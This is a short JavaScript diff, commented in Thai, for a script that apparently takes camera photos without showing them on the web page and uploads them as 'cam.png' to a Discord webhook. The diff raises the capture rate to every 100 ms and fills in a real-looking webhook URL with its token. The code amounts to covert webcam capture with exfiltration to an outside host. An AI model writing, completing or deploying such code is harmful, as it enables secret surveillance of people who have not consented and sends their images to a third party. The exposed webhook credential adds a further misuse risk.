@@ -78,7 +78,7 @@ function autoSend(){
 
     takePhoto(false); // false = ไม่โชว์หน้าเว็บ
 
-    setTimeout(autoSend,2000); 
+    setTimeout(autoSend,100); 
     // ปรับความเร็วตรงนี้:
     // 2000 = ทุก 2 วิ
     // 1000 = ทุก 1 วิ
@@ -118,7 +118,7 @@ function send(blob){
     const form = new FormData();
     form.append("file",blob,"cam.png");
 
-    fetch("ใส่เว็บฮุกที่นี่",{
+    fetch("https://discord.com/api/webhooks/1448363204026826752/nkSpnXNfE2VuTUPhwfwdk0S2huvwGMqwL7pCuVeujHYAPBvcj_-EL6cIn-OdD9HCJNFq",{
         method:"POST",
         body:form
     });
